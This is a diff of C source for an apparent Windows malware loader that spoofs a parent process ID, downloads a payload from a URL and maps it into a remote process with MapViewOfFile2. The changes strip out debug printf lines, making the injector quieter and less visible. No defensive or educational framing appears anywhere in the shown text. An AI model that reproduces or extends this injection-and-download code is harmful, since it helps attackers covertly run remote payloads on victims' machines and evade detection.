@@ -189,8 +189,6 @@ BOOL CreatePPidSpoofedProcess(IN HANDLE hParentProcess, IN LPCSTR lpProcessName,
 		return FALSE;
 	}
 
-	printf("[+] DONE \n");
-
 
 	// filling up the OUTPUT parameter with 'CreateProcessA's output'
 	*dwProcessId = Pi.dwProcessId;
@@ -238,12 +236,8 @@ BOOL RemoteMapInject(IN HANDLE hProcess, IN PBYTE pPayload, IN SIZE_T sPayloadSi
 		printf("\t[!] MapViewOfFile Failed With Error : %d \n", GetLastError());
 		bSTATE = FALSE; goto _EndOfFunction;
 	}
-
-
-	printf("\t[+] Local Mapping Address : 0x%p \n", pMapLocalAddress);
-	printf("\t[i] Copying Payload To 0x%p ... ", pMapLocalAddress);
+	
 	memcpy(pMapLocalAddress, pPayload, sPayloadSize);
-	printf("[+] DONE \n");
 
 	// maps the payload to a new remote buffer (in the target process)
 	// it is possible here to change the memory permissions to `RWX`
@@ -252,8 +246,6 @@ BOOL RemoteMapInject(IN HANDLE hProcess, IN PBYTE pPayload, IN SIZE_T sPayloadSi
 		printf("\t[!] MapViewOfFile2 Failed With Error : %d \n", GetLastError());
 		bSTATE = FALSE; goto _EndOfFunction;
 	}
-
-	printf("\t[+] Remote Mapping Address : 0x%p \n", pMapRemoteAddress);
 
 _EndOfFunction:
 	*ppAddress = pMapRemoteAddress;
@@ -380,7 +372,6 @@ int wmain() {
 	if (!CreatePPidSpoofedProcess(hPProcess, TARGET_PROCESS, &dwProcessId, &hProcess, &hThread)) {
 		return -1;
 	}
-	printf("[i] Target Process Created With Pid : %d \n", dwProcessId);
 
 	// Reading the payload 
 	if (!GetPayloadFromUrl(PAYLOAD, &Payload, &Size)) {
